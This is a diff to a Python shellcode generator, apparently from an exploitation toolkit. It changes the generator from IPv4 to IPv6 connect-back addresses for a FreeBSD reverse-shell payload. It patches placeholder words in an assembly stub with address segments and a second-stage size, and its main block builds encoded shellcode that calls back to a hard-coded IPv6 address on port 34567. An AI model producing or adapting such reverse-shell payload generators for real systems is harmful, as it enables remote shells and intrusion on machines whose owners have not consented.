@@ -64,12 +64,23 @@ class ReverseScodeGen():
         fstr = open("%s/reverse.s" % self.stubDir).read()
         
         fstr = fstr.replace("0xbfbf", "0x%04x" % self.convertPortNum(self.portNum))
-        self.ipAddr = self.convertIpAddrStr(self.ipAddrStr)
-        fstr = fstr.replace("0x0100007f", "0x%08x" % self.ipAddr)
-        fstr = fstr.replace("0xaa", "0x%02x" % self.secondStageSize)        
+
+        ipValues = self.ipAddrStr.split(":")
         
-        sys.stdout.write("[*] IP Addr : [%s] [0x%08x]\n" % ( self.ipAddrStr, self.ipAddr))
-        sys.stdout.write("[*] Port : [0x%04x]\n" % self.portNum)
+        fstr = fstr.replace("0x11111111", ("0x%04x%04x" % (self.convertPortNum(int(ipValues[1],16)),
+                                                           self.convertPortNum(int(ipValues[0],16)))))        
+        fstr = fstr.replace("0x11111112", ("0x%04x%04x" % (self.convertPortNum(int(ipValues[3],16)),
+                                                           self.convertPortNum(int(ipValues[2],16)))))        
+        fstr = fstr.replace("0x11111113", ("0x%04x%04x" % (self.convertPortNum(int(ipValues[5],16)),
+                                                           self.convertPortNum(int(ipValues[4],16)))))        
+        fstr = fstr.replace("0x11111114", ("0x%04x%04x" % (self.convertPortNum(int(ipValues[7],16)),
+                                                           self.convertPortNum(int(ipValues[6],16)))))
+        
+        sys.stdout.write("[*] IP Addr : [%s]\n" % ( self.ipAddrStr))
+        sys.stdout.write("[*] Port : [0x%04x] [%d]\n" % (self.portNum, self.portNum))
+
+        
+        fstr = fstr.replace("0xaaaa", "0x%04x" % self.secondStageSize)        
         
         open(self.asmFilename, "w").write(fstr)
 
@@ -148,7 +159,8 @@ class ReverseScodeGen():
         return scodeBinStr
 
 if __name__ == "__main__":
-    gen = ReverseScodeGen( "192.168.43.128", 34567, 0xff, platform="freebsd", encodeFlag=True)
+    ipAddrStr = "dc19:c7f:2011:2:0000:0000:0000:153"        
+    gen = ReverseScodeGen( ipAddrStr, 34567, 0x180, platform="freebsd", encodeFlag=True)
     gen.getBinScode()
     print gen.getPythonFormatScode()
     #print gen.getCppFormatScode()    
